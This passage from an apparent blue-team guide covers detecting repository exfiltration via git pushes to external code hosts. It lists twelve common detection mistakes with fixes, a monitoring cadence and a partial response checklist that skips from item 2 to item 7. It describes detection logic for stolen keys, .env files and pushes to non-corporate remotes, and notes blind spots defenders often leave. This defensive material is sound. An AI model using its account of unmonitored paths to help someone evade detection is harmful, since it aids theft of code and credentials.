    • Back up repositories and their settings so a takedown or ransom scenario does not destroy your own history.
    • Maintain a tested secret-rotation runbook per platform: cloud keys, signing certs, and PATs, with time-to-rotate targets.

    Response readiness

    • Put the section 4 triage flow on a runbook card, with the owner of each log source named.
    • Practice one tabletop per year: a push is confirmed at 02:00 — who rotates, who calls legal, who talks to the code host's abuse team?

    Common Mistakes and Best Practices

    Twelve mistakes blue teams actually make with this technique. Each one lists the symptom you will see, the root cause, the fix, and the prevention that stops it coming back. A simple habit cadence closes the section.

    Mistake 1 — Blocking github.com for the whole company

    Symptom
    Builds and releases break within the hour; an engineering leader escalates; IT quietly disables the proxy rule and the detection dies with it.
    Root cause
    The rule targeted the destination instead of the behavior. Code hosts are critical infrastructure in a software company.
    Fix
    Replace the block with behavior rules: allow the host, but alert on pushes to non-corporate remotes (R1), runner write-egress (R3), and token mints (R4).
    Prevention
    Any new egress rule gets a one-week shadow mode with FP review before enforcement, and a business-owner sign-off for anything business-critical.

    Mistake 2 — Never ingesting GitHub/GitLab audit logs

    Symptom
    After an incident, the endpoint view is the only view; nobody can say which PATs were minted or which repos were cloned, and the SaaS story has to be guessed.
    Root cause
    The code host is treated as "developer tooling" rather than a Tier-1 log source, so streaming was never configured.
    Fix
    Enable org audit-log streaming to the SIEM this week; backfill the retention window the plan allows; build the R4 and R5 alerts immediately after.
    Prevention
    Add "audit-log streaming" to the onboarding checklist of every new SaaS tool, not just code hosts.

    Mistake 3 — DLP tuned for card numbers, blind to keys and .env files

    Symptom
    PCI dashboards are green while private keys and cloud credentials leave in HTTPS bodies — often discovered only in a retrospective review.
    Root cause
    The rule pack was built for the last audit, not for this technique; source-code-shaped data was never profiled.
    Fix
    Add patterns for PEM blocks, .env structure, and common secret formats (AWS keys, connection strings), then test with harmless synthetic files in the lab.
    Prevention
    Re-test the DLP pack quarterly against a fixed corpus that includes key material and env-file shapes.

    Mistake 4 — Treating "HTTPS to a trusted host" as invisible traffic

    Symptom
    Code-host domains sit in a blanket TLS-exclusion or "do not inspect" list, so nothing but SNI is ever logged for the most common exfil path in a software firm.
    Root cause
    Privacy or performance concerns applied broadly instead of by data class and legal review.
    Fix
    Negotiate scoped inspection for developer subnets where policy allows, or compensate with SaaS-side audit rules and byte-volume analytics.
    Prevention
    Re-review TLS-exclusion lists annually with legal; document what each exclusion costs in detection coverage.

    Mistake 5 — A .git/config rule with no baseline

    Symptom
    R2 fires on every clone; 200 alerts a day; analysts bulk-close; one real remote-add is closed with them.
    Root cause
    The rule shipped without two weeks of volume baselining and without the join to process events that carries the remote URL.
    Fix
    Threshold per host (the SPL in 5.5), join with R1 for URL evidence, and escalate only non-git writers or Temp-directory writes.
    Prevention
    Every new rule gets a baselining ticket before it can page anyone — no exceptions.

    Mistake 6 — No ownership map for developer log sources

    Symptom
    Proxy, EDR, and code-host logs all exist, but in an incident three teams each say "that's not ours"; the first hour is spent on routing, not analysis.
    Root cause
    Detection engineering owned the rules, but nobody owned the sources feeding them.
    Fix
    Publish a one-page source map: source → owner → retention → known gaps, and link it from the triage runbook.
    Prevention
    Review the source map quarterly and after every re-org; unowned sources are treated as gaps, not as someone else's problem.

    Mistake 7 — CI runners left out of scope

    Symptom
    Endpoint coverage is excellent for laptops, but the machines holding signing keys and pipeline secrets have no EDR, no DLP, and unprofiled egress.
    Root cause
    Runners are ephemeral and "infrastructure-owned", which quietly removes them from the security asset list.
    Fix
    Put runners in the asset register, ship EDR or at least process auditing to them, and enable R3 on the proxy.
    Prevention
    Asset-discovery scans must include cloud VMs labeled as build infra; anything with repo credentials is Tier-1 by definition.

    Mistake 8 — Long-lived classic PATs everywhere

    Symptom
    Tokens created in 2023 with full repo scope and no expiry still authenticate; an incident means rotating dozens of unknown-fate tokens.
    Root cause
    Token creation was never governed; convenience won by default.
    Fix
    Inventory and expire classic PATs, move automation to fine-grained short-lived tokens, and enforce an org expiry policy.
    Prevention
    Monthly token-age report to IT security; anything older than the policy gets auto-revoked, not reminded.

    Mistake 9 — Investigating exfiltration as an endpoint-only problem

    Symptom
    The laptop is reimaged and the case closed, while the attacker's private repository — and their clone — keep existing outside your reach.
    Root cause
    Habit: endpoint forensics feels like progress, and the SaaS half requires an abuse-team takedown you have never filed.
    Fix
    Add "SaaS-side actions" to the exfil runbook: list pushed refs, request takedown, revoke tokens, and document what cannot be undone.
    Prevention
    Incident templates for exfil always include a SaaS section with a named owner and a deadline.

    Mistake 10 — Copy-paste tuning: matching the word git instead of the behavior

    Symptom
    The rule matches git pull, git status scripts, and even legit.exe strings; alert volume buries the real pushes.
    Root cause
    The regex was written once from an example and never profiled against a real day of developer traffic.
    Fix
    Anchor on the pair "git client + push verb + URL" (as R1 does), and exclude the approved-remote allow-list from a maintained lookup.
    Prevention
    Replay 30 days of historical events against every new rule before deployment; the FP rate you see in replay is the FP rate you will live with.

    Mistake 11 — No join between HR events and security telemetry

    Symptom
    The Northlake pattern (section 6) goes undetected: leaver DLP reviews happen only when someone remembers to open a ticket.
    Root cause
    HR data lives in a system the SOC cannot query, and the process relies on tickets instead of data.
    Fix
    Sync the joiner-leaver feed daily into the SIEM; add "notice period" as a risk modifier on egress and audit alerts.
    Prevention
    Make the feed part of the SIEM health dashboard — if it stops updating, someone should notice within a day.

    Mistake 12 — Rules tested only in the lab, never against a live baseline

    Symptom
    Sigma rules pass every synthetic test in staging, then flood or starve in production because real developers' clone patterns were never measured.
    Root cause
    No shadow-mode step; "it worked in the lab" was accepted as validation.
    Fix
    Run every 5.5 rule in shadow mode for two weeks, compare volume against expectation, then promote with the measured threshold.
    Prevention
    Documented promotion pipeline: lab → shadow → enforce, with the shadow report attached to the rule's ticket.

    ▍Habit cadence

    Daily

    • Review new PAT and deploy-key events in the audit log.
    • Check R1/R3/R4 pages were dispositioned, not just closed.
    • Glance at runner-subnet egress volume against baseline.

    Weekly

    • Tune the noisiest rule from the week's FP list.
    • Review egress to code hosts for the top five uploaders by bytes.
    • Confirm audit-log streaming is healthy for every code host.

    Monthly

    • Token-age report and auto-revocation sweep.
    • OAuth grant review against the approved-apps list.
    • Replay the rule set against the past month's logs to catch drift.

    Response checklist — confirmed or suspected repository exfiltration

    1. Capture the remote URL from the EDR line, .git/config, or audit event — it anchors everything else.
    2. List the pushed refs (branches, tags, history depth) to size exactly what left.

    7. Review leaver status of the involved user — it changes the legal and HR track immediately.
    8. Add push protection and fix the missing pattern that let this happen, so the same path is closed next week.
